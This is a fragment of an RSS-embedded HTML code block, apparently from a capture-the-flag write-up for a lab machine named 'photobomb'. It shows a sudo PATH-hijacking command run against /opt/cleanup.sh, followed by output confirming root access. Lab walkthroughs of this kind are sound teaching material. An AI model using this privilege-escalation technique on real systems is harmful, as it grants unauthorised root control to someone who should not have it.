+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>wizard@photobomb:~$ sudo PATH&lt;span style="color:#fe8019">=&lt;/span>$PWD:$PATH /opt/cleanup.sh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo PATH&lt;span style="color:#fe8019">=&lt;/span>$PWD:$PATH /opt/cleanup.sh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@photobomb:/home/wizard/photobomb# id
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#fe8019">=&lt;/span>0&lt;span style="color:#fe8019">(&lt;/span>root&lt;span style="color:#fe8019">)&lt;/span> gid&lt;span style="color:#fe8019">=&lt;/span>0&lt;span style="color:#fe8019">(&lt;/span>root&lt;span style="color:#fe8019">)&lt;/span> groups&lt;span style="color:#fe8019">=&lt;/span>0&lt;span style="color:#fe8019">(&lt;/span>root&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@photobomb:/home/wizard/photobomb# whoami
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>whoami
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></content></item></channel></rss>
